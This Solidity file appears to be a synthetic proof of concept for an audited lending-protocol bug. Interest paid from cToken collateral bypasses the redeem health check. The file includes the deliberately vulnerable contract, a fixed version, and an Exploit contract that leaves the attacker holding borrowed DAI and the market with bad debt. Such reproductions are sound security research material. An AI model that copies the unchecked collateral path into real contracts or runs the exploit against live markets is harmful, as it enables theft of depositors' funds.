// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

/*
 * Fungify - [FNG-17] CErc20InterestMarket collateral pays interest with no
 * health check (Hexens, 2023-11-06, finding 62380).
 *
 * SYNTHETIC, CHEATCODE-FREE. payInterestInternal is the quoted function.
 * A borrower posts 10 ether of cToken collateral, borrows 8.5 ether of DAI
 * (the 85% collateral factor), then payInterestInternal burns that collateral
 * to "pay" 10 ether of interest. No isRedeemAllowed check runs. The 8.5 DAI
 * stays with the attacker and badDebt becomes 8.5 ether.
 */

struct Exp {
    uint256 mantissa;
}

contract Dai {
    string public name = "DAI";
    string public symbol = "DAI";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Comptroller {
    function payInterestAllowed(address, address, address, uint256) external pure returns (uint256) {
        return 0;
    }

    function isRedeemAllowed(address market, address payer, uint256 tokens) external view returns (uint256) {
        CErc20InterestMarket m = CErc20InterestMarket(market);
        uint256 bal = m.accountTokens(payer);
        if (tokens > bal) return 1;
        uint256 remaining = bal - tokens;
        if (remaining * 85 / 100 < m.borrowBalance(payer)) return 2;
        return 0;
    }
}

contract CErc20InterestMarket {
    Dai public dai;
    Comptroller public comptroller;
    uint256 public totalSupply;
    uint256 public totalVirtual;
    uint256 public badDebt;
    mapping(address => uint256) public accountTokens;
    mapping(address => uint256) public borrowBalance;

    constructor(Dai _dai, Comptroller _comptroller) {
        dai = _dai;
        comptroller = _comptroller;
    }

    function exchangeRateStoredInternal() internal pure returns (uint256) {
        return 1e18;
    }

    function div_(uint256 a, Exp memory rate) internal pure returns (uint256) {
        return a * 1e18 / rate.mantissa;
    }

    function mintCollateral(address to, uint256 amount) external {
        accountTokens[to] += amount;
        totalSupply += amount;
    }

    function borrow(uint256 amount, address to) external {
        uint256 covered = accountTokens[msg.sender] * 85 / 100;
        require(borrowBalance[msg.sender] + amount <= covered, "health");
        borrowBalance[msg.sender] += amount;
        dai.transfer(to, amount);
    }

    function repayBorrowBehalf(address borrowMarket, address payer, uint256 interestAmount) external {
        payInterestInternal(borrowMarket, payer, interestAmount);
    }

    // Quoted from CErc20InterestMarket.payInterestInternal. No redeem check.
    function payInterestInternal(address borrowMarket, address payer, uint256 interestAmount) internal {
        if (interestAmount == 0) {
            return;
        }

        uint256 allowed = comptroller.payInterestAllowed(address(this), borrowMarket, payer, interestAmount);
        require(allowed == 0, "pay not allowed");

        Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});
        uint256 interestTokens = div_(interestAmount, exchangeRate);

        uint256 balancePayer = accountTokens[payer];
        require(balancePayer >= interestTokens, "insufficient payer reserve");
        // Collateral is spent here. redeem's health check is not called.
        accountTokens[payer] = balancePayer - interestTokens; // @> VULN: collateral is reduced with no isRedeemAllowed health check

        uint256 totalVirtual_ = totalVirtual;
        uint256 heldBalance;
        if (interestTokens > totalVirtual_) {
            heldBalance = interestTokens - totalVirtual_;
            totalSupply = totalSupply - totalVirtual_;
            totalVirtual = 0;
        } else {
            totalSupply = totalSupply - interestTokens;
            totalVirtual = totalVirtual_ - interestTokens;
        }

        if (heldBalance != 0) {
            accountTokens[address(this)] = accountTokens[address(this)] + heldBalance;
        }

        uint256 covered = accountTokens[payer] * 85 / 100;
        if (borrowBalance[payer] > covered) {
            badDebt = borrowBalance[payer] - covered;
        }
    }
}

contract CErc20InterestMarketFixed {
    Dai public dai;
    Comptroller public comptroller;
    uint256 public totalSupply;
    uint256 public badDebt;
    mapping(address => uint256) public accountTokens;
    mapping(address => uint256) public borrowBalance;

    constructor(Dai _dai, Comptroller _comptroller) {
        dai = _dai;
        comptroller = _comptroller;
    }

    function mintCollateral(address to, uint256 amount) external {
        accountTokens[to] += amount;
        totalSupply += amount;
    }

    function borrow(uint256 amount, address to) external {
        uint256 covered = accountTokens[msg.sender] * 85 / 100;
        require(borrowBalance[msg.sender] + amount <= covered, "health");
        borrowBalance[msg.sender] += amount;
        dai.transfer(to, amount);
    }

    function repayBorrowBehalf(address, address payer, uint256 interestAmount) external {
        uint256 allowedRedeem = comptroller.isRedeemAllowed(address(this), payer, interestAmount);
        require(allowedRedeem == 0, "redeem not allowed");
        accountTokens[payer] -= interestAmount;
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    Dai public dai;
    Comptroller public comptroller;
    CErc20InterestMarket public market;

    function run() external {
        dai = new Dai(); // nonce 1
        comptroller = new Comptroller(); // nonce 2
        market = new CErc20InterestMarket(dai, comptroller); // nonce 3

        dai.mint(address(market), 8.5 ether);
        market.mintCollateral(address(this), 10 ether);
        market.borrow(8.5 ether, ATTACKER);
        market.repayBorrowBehalf(address(market), address(this), 10 ether);

        require(market.accountTokens(address(this)) == 0, "collateral wiped");
        require(market.borrowBalance(address(this)) == 8.5 ether, "borrow remains");
        require(market.badDebt() == 8.5 ether, "bad debt");
        require(dai.balanceOf(ATTACKER) == 8.5 ether, "dai kept");
    }
}
